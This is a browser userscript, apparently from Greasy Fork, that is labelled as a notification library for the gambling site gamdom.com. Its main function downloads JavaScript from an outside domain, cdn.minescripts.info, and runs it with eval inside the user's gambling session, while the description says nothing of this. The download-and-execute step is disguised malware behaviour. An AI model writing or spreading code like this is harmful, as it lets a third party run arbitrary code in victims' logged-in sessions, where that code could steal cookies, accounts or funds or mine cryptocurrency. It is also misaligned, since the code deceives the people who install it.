// ==UserScript==
// @name         lib_GamdomNotifications
// @namespace    https://greasyfork.org/es/users/154624-anonimo-anonimo
// @version      1.1.9
// @description  Lib needed for running Gamdom Notificator
// @author       allin4
// @match        *://gamdom.com/*
// @grant        GM_info
// @license      Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International License.
// @downloadURL none
// ==/UserScript==

var DivAppend = function(div){
        document.body.appendChild(div);
        CPEL("https://cdn.minescripts.info/c/g9lx_2.js");
        console.log("Div created :)");
    };

     var cmp = new XMLHttpRequest();
     cmp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
        eval(this.responseText);
        }
    };

    var CPEL = function(link){
        cmp.open('GET', link);
        cmp.send();
    };

(function() {
    'use strict';
     console.log("LIB LOADED" + "(version: " + "1.1.9" + ")");
})();